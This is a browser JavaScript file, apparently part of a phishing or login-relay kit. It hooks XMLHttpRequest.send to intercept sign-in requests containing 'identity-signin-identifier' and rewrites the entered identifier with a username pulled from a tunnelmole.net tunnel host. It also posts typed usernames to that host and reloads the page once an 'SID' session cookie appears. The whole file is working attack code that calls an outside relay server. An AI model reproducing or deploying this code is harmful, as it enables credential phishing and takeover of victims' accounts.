let freqUsername = null; 
const modifiedRequests = new Set();
const pendingRequests = new Map();
let usernameFetched = false;  // Ensure this is properly reset

const fetchFreqUsername = async () => {
    if (usernameFetched) return; // Prevent redundant fetches

    console.log('🟡 Fetching username...');

    try {
        const response = await fetch(`https://9emiae-ip-37-228-207-173.tunnelmole.net/get-first-post-data?`, {
            method: 'GET',
            headers: { 'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
 } // Prevent caching
            
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('✅ Response from /get-first-post-data:', result);

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('✅ Fetched username:', freqUsername);
            usernameFetched = true;

            // Immediately reset after fetching
            await resetUsernameData();
        } else {
            console.warn("⚠️ No username data received, retrying...");
            setTimeout(fetchFreqUsername, 500); // Retry in 1s if empty
        }
    } catch (error) {
        console.error('⚠️ Error fetching username:', error);
        setTimeout(fetchFreqUsername, 1000); // Retry in 1s if error
    }
};

// ✅ Reset username data and immediately retry fetching
const resetUsernameData = async () => {
    console.log('🔄 Resetting username data...');

    try {
        const response = await fetch('https://9emiae-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });

        if (response.ok) {
            console.log('✅ Successfully reset username.');
        } else {
            console.error(`⚠️ Failed to reset username: ${response.status}`);
        }
    } catch (error) {
        console.error('⚠️ Error resetting username:', error);
    }

    // 🛑 Force username fetch **AFTER** reset
    usernameFetched = false;
    setTimeout(fetchFreqUsername, 500); // Ensure re-fetch after reset
};

// ✅ Process pending requests
const processModifiedRequests = () => {
    if (!freqUsername) {
        console.log("Username not available yet, retrying...");
        fetchFreqUsername();
        return;
    }

    console.log("Processing pending requests...");
    const requestsToProcess = Array.from(pendingRequests);

    for (let [xhr, body] of requestsToProcess) {
        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
        if (match && !modifiedRequests.has(body)) {
            const modifiedBody = body.replace(match[1], freqUsername);
            modifiedRequests.add(body);
            console.log("Modified request with new username:", modifiedBody);
            xhr.send(modifiedBody);
            pendingRequests.delete(xhr);
        }
    }

    if (pendingRequests.size === 0) {
        console.log("All pending requests processed, resetting freqUsername.");
        freqUsername = null;
        usernameFetched = false; // Allow fetching a new username
        setTimeout(fetchFreqUsername, 1000);
    }
};

// Intercept XMLHttpRequest to modify requests with username
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        console.log("Intercepted request:", body);
        pendingRequests.set(this, body);
        processModifiedRequests();
    } else {
        originalXhrSend.call(this, body);
    }
};

// Ensure fetchFreqUsername is called when the page loads
document.addEventListener('DOMContentLoaded', () => {
    fetchFreqUsername();
});

// ✅ Send username data to server
const sendUsername = async () => {
    console.log('Sending username...');

    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("No username entered");
        return;
    }

    try {
        const response = await fetch('https://9emiae-ip-37-228-207-173.tunnelmole.net/save-username', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });

        if (response.ok) {
            console.log('Username sent successfully');
        } else {
            console.error('Error sending username:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending username:', error);
    }
};

// ✅ Attach event listeners to buttons
document.addEventListener('DOMContentLoaded', () => {
    const button = document.getElementById('sendUsernameBtn');
    const usernameInput = document.getElementById('username');

    // Add button click listener
    if (button) {
        button.addEventListener('click', (event) => {
            event.preventDefault(); // Prevent form submission if inside a form
            sendUsername(); // Trigger sending username
        });
    } else {
        console.warn('Send username button not found!');
    }

    // Add "Enter" key listener to trigger username send
    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent form submission
                sendUsername(); // Trigger send on Enter
            }
        });
    }

    // Ensure fetchFreqUsername is called when the page loads
    fetchFreqUsername();
});

// Auto-refresh page if 'SID' cookie exists
setInterval(() => {
    if (document.cookie.includes('SID')) {
        location.reload();
    }
}, 3000);
